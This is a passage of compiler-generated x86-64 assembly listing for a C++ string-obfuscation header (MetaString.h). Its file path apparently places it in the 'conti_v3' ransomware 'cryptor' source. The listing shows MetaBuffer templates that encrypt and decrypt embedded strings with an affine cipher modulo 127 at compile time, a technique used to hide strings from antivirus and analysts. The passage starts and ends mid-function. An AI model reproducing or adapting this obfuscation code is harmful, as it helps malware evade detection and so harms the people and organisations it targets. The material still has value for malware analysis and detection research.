  00d3f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00d44	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00d4b	88 41 50	 mov	 BYTE PTR [rcx+80], al
  00d4e	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00d55	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  00d59	88 85 c0 00 00
	00		 mov	 BYTE PTR tv658[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  00d5f	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00d66	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  00d6d	5f		 pop	 rdi
  00d6e	5d		 pop	 rbp
  00d6f	c3		 ret	 0
??0?$MetaBuffer@$0GH@$0BB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::MetaBuffer<103,17,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z PROC ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 4e	 sub	 eax, 78			; 0000004eH
  0002d	6b c0 0a	 imul	 eax, eax, 10
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z PROC ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 59	 imul	 eax, eax, 89		; 00000059H
  0002d	83 c0 4e	 add	 eax, 78			; 0000004eH
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEBA_NXZ ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 50	 cmp	 QWORD PTR i$1[rbp], 80	; 00000050H
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEBA_NXZ PROC ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv658 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
